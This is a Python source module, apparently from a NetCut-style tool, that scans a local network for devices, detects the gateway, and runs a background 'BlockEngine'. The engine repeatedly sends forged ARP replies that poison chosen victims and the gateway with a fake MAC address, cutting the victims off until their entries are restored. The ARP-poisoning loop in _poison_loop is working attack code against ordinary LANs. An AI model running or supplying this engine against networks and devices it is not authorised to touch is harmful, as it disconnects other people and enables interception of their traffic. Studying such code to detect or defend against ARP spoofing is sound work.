"""Network layer: discovery, gateway detection and the ARP spoofing engine.

Requires scapy and elevated privileges (root / Administrator).
"""

from __future__ import annotations

import ipaddress
import socket
import subprocess
import threading
import time
from dataclasses import dataclass, field
from typing import Callable, Iterable

from .utils import IS_WINDOWS, normalize_mac
from .whitelist import Whitelist


@dataclass
class Device:
    ip: str
    mac: str
    hostname: str = ""
    vendor: str = ""

    @property
    def key(self) -> str:
        return normalize_mac(self.mac)


def _lazy_scapy():
    """Import scapy lazily so `--help` works without it installed."""
    try:
        from scapy.all import ARP, Ether, conf, srp  # noqa: F401
        from scapy.all import get_if_hwaddr  # noqa: F401
        return True
    except ImportError as exc:  # pragma: no cover - environment dependent
        raise RuntimeError(
            "scapy is not installed. Install it with: pip install scapy"
        ) from exc


def _local_iface() -> tuple[str, str]:
    """Return (iface_name, own_mac) for the default route interface."""
    _lazy_scapy()
    from scapy.all import conf, get_if_hwaddr

    iface = conf.iface
    name = getattr(iface, "name", str(iface))
    return name, get_if_hwaddr(iface)


def _iface_network(iface_name: str) -> ipaddress.IPv4Network:
    """Return the /24 subnet where the host resides.

    Scanning a full /24 (256 IPs) is extremely reliable and prevents packet loss
    on Wi-Fi, which often occurs when attempting to scan massive /21 networks (2048 IPs).
    """
    from scapy.all import conf
    try:
        iface = conf.ifaces.dev_from_name(iface_name)
        addr = iface.ip
        return ipaddress.IPv4Network(f"{addr}/24", strict=False)
    except Exception:
        # fallback: derive from connected socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            addr = s.getsockname()[0]
        finally:
            s.close()
        return ipaddress.IPv4Network(f"{addr}/24", strict=False)


def _get_system_arp_cache() -> list[tuple[str, str]]:
    """Harvest IP and MAC pairs from OS ARP table / neighbor cache."""
    pairs = []
    try:
        if IS_WINDOWS:
            out = subprocess.check_output(["arp", "-a"], text=True)
            for line in out.splitlines():
                parts = line.split()
                if len(parts) >= 2:
                    ip = parts[0].strip("()")
                    mac = parts[1].replace("-", ":").lower()
                    try:
                        if ipaddress.ip_address(ip) and len(mac) == 17:
                            pairs.append((ip, mac))
                    except Exception:
                        pass
        else:
            out = subprocess.check_output(["ip", "neighbor", "show"], text=True)
            for line in out.splitlines():
                parts = line.split()
                if len(parts) >= 5 and "lladdr" in parts:
                    ip = parts[0]
                    mac = parts[parts.index("lladdr") + 1]
                    pairs.append((ip, mac))
    except Exception:
        pass
    return pairs


def get_gateway(iface_name: str | None = None) -> tuple[str, str]:
    """Return (gateway_ip, gateway_mac)."""
    _lazy_scapy()
    from scapy.all import ARP, Ether, conf, srp

    if iface_name is None:
        iface_name, _ = _local_iface()

    gw_ip = None
    try:
        iface = conf.ifaces.dev_from_name(iface_name)
        gw_ip = getattr(iface, "router", None) or getattr(iface, "gw", None)
    except Exception:
        gw_ip = None

    if not gw_ip:
        try:
            if IS_WINDOWS:
                out = subprocess.check_output(["route", "print"], text=True)
                for line in out.splitlines():
                    if "Default" in line or "0.0.0.0" in line:
                        parts = line.split()
                        if len(parts) >= 3 and parts[2] != "0.0.0.0":
                            gw_ip = parts[2]
                            break
            else:
                out = subprocess.check_output(
                    ["ip", "route", "show", "default"], text=True
                )
                for line in out.splitlines():
                    if "via" in line:
                        gw_ip = line.split("via")[1].split()[0]
                        break
        except Exception:
            pass

    if not gw_ip:
        raise RuntimeError("Could not detect the default gateway.")

    # resolve gateway MAC via ARP
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw_ip),
        timeout=3,
        iface=iface_name,
        verbose=0,
    )
    gw_mac = None
    for _, rcv in ans:
        gw_mac = normalize_mac(rcv.hwsrc)
        break
    if not gw_mac:
        raise RuntimeError(f"Gateway {gw_ip} did not answer ARP.")
    return gw_ip, gw_mac


def scan_devices(
    iface_name: str | None = None,
    timeout: float = 3.0,
    resolve_names: bool = True,
) -> list[Device]:
    """ARP-scan the local subnet and merge with system ARP cache."""
    _lazy_scapy()
    from scapy.all import ARP, Ether, srp

    if iface_name is None:
        iface_name, _ = _local_iface()

    devices: dict[str, Device] = {}

    # 1. Harvest system ARP cache first (instant, gets all known active devices)
    for ip, mac in _get_system_arp_cache():
        try:
            if ipaddress.ip_address(ip).is_private:
                devices[ip] = Device(ip=ip, mac=normalize_mac(mac))
        except Exception:
            pass

    # 2. Perform active ARP scan on the subnet
    try:
        net = _iface_network(iface_name)
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(net)),
            timeout=timeout,
            iface=iface_name,
            verbose=0,
        )
        for _, rcv in ans:
            ip = rcv.psrc
            mac = normalize_mac(rcv.hwsrc)
            devices[ip] = Device(ip=ip, mac=mac)
    except Exception:
        pass

    if resolve_names:
        for dev in devices.values():
            if not dev.hostname:
                try:
                    socket.setdefaulttimeout(0.3)
                    dev.hostname = socket.gethostbyaddr(dev.ip)[0]
                except Exception:
                    dev.hostname = ""

    return sorted(devices.values(), key=lambda d: ipaddress.ip_address(d.ip))


@dataclass
class BlockEngine:
    """Runs ARP poisoning in a background thread for the blocked set."""

    gateway_ip: str
    gateway_mac: str
    iface_name: str
    whitelist: Whitelist
    # MAC announced to victims in place of the gateway. Defaults to our own MAC.
    poison_mac: str = "02:00:00:00:00:01"
    interval: float = 1.0
    on_event: Callable[[str], None] | None = None

    _targets: dict[str, str] = field(default_factory=dict)  # ip -> real mac
    _stop: threading.Event = field(default_factory=threading.Event)
    _thread: threading.Thread | None = None

    # -- public API --------------------------------------------------------
    def block(self, ip: str, mac: str) -> None:
        if self.is_whitelisted(mac):
            self._log(f"refusing to block whitelisted {ip} ({mac})")
            return

        if self.is_protected(mac):
            self._log(f"refusing to block protected/self {ip} ({mac})")
            return

        self._targets[ip] = normalize_mac(mac)
        self._ensure_running()
        self._log(f"blocking {ip} ({mac})")

    def unblock(self, ip: str) -> None:
        mac = self._targets.pop(ip, None)
        if mac:
            self._restore(ip, mac)
            self._log(f"restored {ip} ({mac})")
        if not self._targets:
            self._log("no targets left; engine idle")

    def unblock_all(self) -> None:
        ips = list(self._targets.keys())
        for ip in ips:
            self.unblock(ip)
        self.stop()

    def stop(self) -> None:
        self._stop.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=2.0)
        self._thread = None
        self._stop.clear()
        # restore all targets
        for ip, mac in list(self._targets.items()):
            try:
                self._restore(ip, mac)
            except Exception:
                pass
        self._targets.clear()
        self._log("restored all devices")

    def is_whitelisted(self, mac: str) -> bool:
        return self.whitelist.is_whitelisted(mac)

    def is_protected(self, mac: str) -> bool:
        _, own_mac = _local_iface()
        return normalize_mac(mac) == normalize_mac(own_mac) or normalize_mac(mac) == normalize_mac(self.gateway_mac)

    # -- internal worker ---------------------------------------------------
    def _log(self, msg: str) -> None:
        if self.on_event:
            self.on_event(msg)

    def _ensure_running(self) -> None:
        if self._thread and self._thread.is_alive():
            return
        self._stop.clear()
        self._thread = threading.Thread(target=self._poison_loop, daemon=True)
        self._thread.start()

    def _poison_loop(self) -> None:
        _lazy_scapy()
        from scapy.all import ARP, send

        while not self._stop.is_set():
            for ip, mac in list(self._targets.items()):
                if self.is_whitelisted(mac) or self.is_protected(mac):
                    continue
                try:
                    # Tell victim: gateway IP is at poison_mac
                    send(
                        ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip, hwsrc=self.poison_mac),
                        iface=self.iface_name,
                        verbose=0,
                    )
                    # Tell gateway: victim IP is at poison_mac
                    send(
                        ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=ip, hwsrc=self.poison_mac),
                        iface=self.iface_name,
                        verbose=0,
                    )
                except Exception as exc:
                    self._log(f"poison error for {ip}: {exc}")
            time.sleep(self.interval)

    def _restore(self, ip: str, mac: str) -> None:
        _lazy_scapy()
        from scapy.all import ARP, send

        try:
            # Restore victim with real gateway MAC
            send(
                ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac),
                iface=self.iface_name,
                count=4,
                verbose=0,
            )
            # Restore gateway with victim's real MAC
            send(
                ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=ip, hwsrc=mac),
                iface=self.iface_name,
                count=4,
                verbose=0,
            )
        except Exception as exc:
            self._log(f"restore error for {ip}: {exc}")
